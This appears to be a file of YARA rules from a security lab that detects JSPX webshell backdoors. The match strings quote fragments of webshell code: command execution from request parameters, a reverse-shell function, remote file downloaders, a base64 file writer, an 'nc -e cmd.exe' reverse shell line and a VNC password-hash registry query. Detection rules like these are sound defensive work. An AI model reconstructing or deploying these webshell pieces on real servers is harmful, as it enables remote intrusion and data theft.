rule a20dcd6bfafb313da2ed9e8bf006b0cf6026084c
{
    meta:
        description = "jspx - file a20dcd6bfafb313da2ed9e8bf006b0cf6026084c.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f6f595e9f21080963543943e8f32a126b638140c10b78c8cf4580cbbf65db32a"
    strings:
        $x1 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s2 = "n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.get" fullword ascii
        $s3 = "1\");}else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.get" ascii
        $s4 = "String[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"s" ascii
        $s5 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s6 = "g p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.execut" ascii
        $s7 = "* from \"+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++){sb.append(d.getColumnName" ascii
        $s8 = "r(int i=1; i &lt;=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file" ascii
        $s9 = "rective.page import=\"java.text.*\"/><jsp:declaration>String Pwd=\"maskshell\";String cs=\"UTF-8\";String EC(String s)throws Exc" ascii
        $s10 = ".forName(x[0].trim());if(x[1].indexOf(\"jdbc:oracle\")!=-1){return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equal" ascii
        $s11 = "equest.getSession().getServletContext().getRealPath(\"/\");if(Z.equals(\"A\")){sb.append(s+\"\\t\");if(!s.substring(0,1).equals(" ascii
        $s12 = "{if(q.indexOf(\"--f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}" ascii
        $s13 = "re\" version=\"1.2\"><jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" /><jsp:directive.page import=\"java.io" ascii
        $s14 = "eQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount(" ascii
        $s15 = "uteUpdate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}" ascii
        $s16 = "util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0; i&lt;l.length; i++){dt=new java.util" ascii
        $s17 = ");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int" ascii
        $s18 = "x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int " ascii
        $s19 = ".toString());</jsp:scriptlet></jsp:root>" fullword ascii
        $s20 = ".close();}</jsp:declaration><jsp:scriptlet>cs=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.s" ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_5ff6df3eb3c25a5e9fc0ea598c0ab85db6512f41
{
    meta:
        description = "jspx - file 5ff6df3eb3c25a5e9fc0ea598c0ab85db6512f41.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "253adc10df3a80783afacc8f6a19071d201c9956e1a531b41832ed9338111047"
    strings:
        $x1 = "return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);" fullword ascii
        $s2 = "out.write((\"User:\\t\"+exec(\"whoami\")).getBytes());" fullword ascii
        $s3 = "shell(request.getParameter(\"host\"), Integer.parseInt(request.getParameter(\"port\")));" fullword ascii
        $s4 = "out.println(exec(request.getParameter(\"cmd\")));" fullword ascii
        $s5 = "public static void shell(String host,int port) throws UnknownHostException, IOException{" fullword ascii
        $s6 = "out.println(auto(request.getParameter(\"url\"),request.getParameter(\"fileName\"),request.getParameter(\"cmd\")));" fullword ascii
        $s7 = "<jsp:directive.page contentType=\"text/html\" import=\"java.util.*,java.io.*,java.net.*\" pageEncoding=\"UTF-8\" />" fullword ascii
        $s8 = "out.write(exec(new String(b,0,a,\"UTF-8\").trim()).getBytes(\"UTF-8\"));" fullword ascii
        $s9 = "encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;" fullword ascii
        $s10 = "download(request.getParameter(\"url\"), request.getParameter(\"path\"));" fullword ascii
        $s11 = "xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"1.2\">" fullword ascii
        $s12 = "public static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{" fullword ascii
        $s13 = "public static void download(String url,String path) throws MalformedURLException, IOException{" fullword ascii
        $s14 = "public static String exec(String cmd) {" fullword ascii
        $s15 = "return System.getProperty(\"sun.jnu.encoding\");" fullword ascii
        $s16 = "copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);" fullword ascii
        $s17 = "* @throws UnknownHostException" fullword ascii
        $s18 = "String out = exec(cmd);" fullword ascii
        $s19 = "* @param host" fullword ascii
        $s20 = "cmd /c dir " fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9845d43612a8f384ade74af23dcc4e9e94f7de6a
{
    meta:
        description = "jspx - file 9845d43612a8f384ade74af23dcc4e9e94f7de6a.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "503bd5d384a4b3d4879cc277e9a2e088b35f36649da5a91e103c7ea3f12060a0"
    strings:
        $s1 = "Runtime.getRuntime().exec(request.getParameter(\"i\")); " fullword ascii
        $s2 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"  version=\"1.2\"> " fullword ascii
        $s3 = "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" /> " fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_6744f627f43f81dbc1a1a682ab3e02a2e50ee682
{
    meta:
        description = "jspx - file 6744f627f43f81dbc1a1a682ab3e02a2e50ee682.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "61d34e67ae3b3c28281dd29a2a8dd90a7ee3924a2550a0fc7b8eb1c01c7f83c7"
    strings:
        $x1 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s2 = "lse if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputSt" ascii
        $s3 = "[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select " ascii
        $s4 = "rows Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery" ascii
        $s5 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s6 = "();}</jsp:declaration><jsp:scriptlet>cs=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.setCont" ascii
        $s7 = "(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(" ascii
        $s8 = "i=1; i &lt;=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new F" ascii
        $s9 = "ileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputS" ascii
        $s10 = "indexOf(\"--f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw" ascii
        $s11 = "re\" version=\"1.2\"><jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" /><jsp:directive.page import=\"java.io" ascii
        $s12 = "wLine();}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m." ascii
        $s13 = "ate(q);sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.clo" ascii
        $s14 = ".util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;F" ascii
        $s15 = ".getSession().getServletContext().getRealPath(\"/\");if(Z.equals(\"A\")){sb.append(s+\"\\t\");if(!s.substring(0,1).equals(\"/\")" ascii
        $s16 = "am(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(\"N\")){NN(z1,sb);}else if(Z.equals(\"O\")){OO(z1,sb);}else if(Z.equals(\"P" ascii
        $s17 = "th; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte" ascii
        $s18 = "nputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((\"|\"+\"&lt;-" ascii
        $s19 = "ing());</jsp:scriptlet></jsp:root>" fullword ascii
        $s20 = "me(x[0].trim());if(x[1].indexOf(\"jdbc:oracle\")!=-1){return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnor" ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_6647a2558627cdaa2b04f157f3dd33e7838fdd3c
{
    meta:
        description = "jspx - file 6647a2558627cdaa2b04f157f3dd33e7838fdd3c.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "516aea7ffc7290d70da3b32d456569bf532c06cccd2350b83e915d3ea883e667"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); " fullword ascii
        $s2 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"  version=\"1.2\"> " fullword ascii
        $s3 = "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" /> " fullword ascii
        $s4 = "if(\"sin\".equals(request.getParameter(\"pwd\"))){ " fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_30dae7c1473b767d44f8e30600891a524ac8dea0
{
    meta:
        description = "jspx - file 30dae7c1473b767d44f8e30600891a524ac8dea0.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6a1abb8160757fc5fcfae54d268f3469f7678a20c7c303050b742ede12e92850"
    strings:
        $s1 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\"><jsp:scriptlet>new java.io.FileOutputStream(application.get" ascii
        $s2 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\"><jsp:scriptlet>new java.io.FileOutputStream(application.get" ascii
        $s3 = "Path(\"/\")+\"/\"+request.getParameter(\"f\")).write(new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter(\"c\")));out" ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule aaee794b7c8b091313325da6082cd2d361e400f6
{
    meta:
        description = "jspx - file aaee794b7c8b091313325da6082cd2d361e400f6.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "64198dff4b40fa415ca860d863bf23bf1c30b5cf5fed5964b13529e784d89a51"
    strings:
        $x1 = "for(int i=0; i&lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH" ascii
        $s2 = "ubstring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(" ascii
        $s3 = "for(int k=0; k &lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse" fullword ascii
        $s4 = "String EC(String s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{" fullword ascii
        $s5 = "nt m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[x.length-1]);ResultSetMetaData d=r.getMetaData" ascii
        $s6 = "for(int i=0; i&lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}voi" fullword ascii
        $s7 = "Statement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f" ascii
        $s8 = "nd(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"&lt;-\");out.print(sb.toString());</jsp:scriptlet></jsp:root>" fullword ascii
        $s9 = "while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((\"|\"+\"&lt;-\").getBytes(),0,3);" fullword ascii
        $s10 = "ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));" fullword ascii
        $s11 = "if(x.length>4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();" fullword ascii
        $s12 = "//http://www.gslypx.com/oo.jspx?z0=utf-8" fullword ascii
        $s13 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s14 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s15 = "for(int i=0;i&lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception" fullword ascii
        $s16 = "\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);" fullword ascii
        $s17 = "close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t" ascii
        $s18 = "ection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-" ascii
        $s19 = "for(int i=0; i&lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());" fullword ascii
        $s20 = "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" />" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_61d0434c0ba2bb815a20c5878f9c1ee672b9f61e
{
    meta:
        description = "jspx - file 61d0434c0ba2bb815a20c5878f9c1ee672b9f61e.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3e9c4aea7f12cfe9834e5cfa08628767ea22f02b22635afd736d45a70b3962e4"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
        $x2 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"+" fullword ascii
        $x3 = "Process pro = Runtime.getRuntime().exec(command);" fullword ascii
        $x4 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
        $x5 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"+" fullword ascii
        $x6 = "cmd = \"cmd.exe /c set\";" fullword ascii
        $s7 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
        $s8 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
        $s9 = "//((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
        $s10 = "Process pro = Runtime.getRuntime().exec(program);" fullword ascii
        $s11 = "Process process = Runtime.getRuntime().exec(program);" fullword ascii
        $s12 = "ins.put(\"executesql\",new ExecuteSQLInvoker());" fullword ascii
        $s13 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s14 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
        $s15 = "StreamConnector.readFromLocal(new DataInputStream(targetS.getInputStream()),new DataOutputStream(yourS.getOutputStream()));" fullword ascii
        $s16 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"+" fullword ascii
        $s17 = "(new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();" fullword ascii
        $s18 = "Object obj = ((DBOperator)dbo).execute(sql);" fullword ascii
        $s19 = "((Invoker)ins.get(\"vPortScan\")).invoke(request,response,JSession);" fullword ascii
        $s20 = "ins.put(\"vLogin\",new VLoginInvoker());" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ab52ce045d029a36b38aac98c497f4cd2371acd1
{
    meta:
        description = "jspx - file ab52ce045d029a36b38aac98c497f4cd2371acd1.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b02203cd293a9b790d67cab61371925bc44ac0ea63722953314c88dc2588012c"
    strings:
        $x1 = "Process child = Runtime.getRuntime().exec(cmd);" fullword ascii
        $s2 = "xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"1.2\">" fullword ascii
        $s3 = "String cmd = request.getParameter(\"paxmac\");" fullword ascii
        $s4 = "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"gb2312\"/>" fullword ascii
        $s5 = "System.err.println(e);" fullword ascii
        $s6 = "InputStream in = child.getInputStream();" fullword ascii
        $s7 = "while ((c = in.read()) != -1) {" fullword ascii
        $s8 = "<jsp:directive.page import=\"java.io.*\"/>" fullword ascii
        $s9 = "if (cmd !=null){" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_70dcd8a49a4e7f529098dadfd2d172b692cd5c93
{
    meta:
        description = "jspx - file 70dcd8a49a4e7f529098dadfd2d172b692cd5c93.jspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8fcf4fc642b4d90215e4e78f19a708a2cfc2e85c9abaa9758938505d11d5de71"
    strings:
        $s1 = "Process p = Runtime.getRuntime().exec(str);" fullword ascii
        $s2 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s3 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s4 = "String tmp = pageContext.getRequest().getParameter(\"str\");" fullword ascii
        $s5 = "<jsp:directive.page contentType=\"text/html;charset=UTF-8\" pageEncoding=\"UTF-8\"/>" fullword ascii
        $s6 = "String str = new String((new BASE64Decoder()).decodeBuffer(tmp));" fullword ascii
        $s7 = "BufferedReader br = new BufferedReader(new InputStreamReader(in,\"GBK\"));" fullword ascii
        $s8 = "<jsp:directive.page import=\"sun.misc.BASE64Decoder\"/>" fullword ascii
        $s9 = "InputStream in = p.getInputStream();" fullword ascii
        $s10 = "<jsp:directive.page import=\"java.util.*\"/>" fullword ascii
        $s11 = "<jsp:directive.page import=\"java.io.*\"/>" fullword ascii
        $s12 = "if (tmp != null&&!\"\".equals(tmp)) {" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}
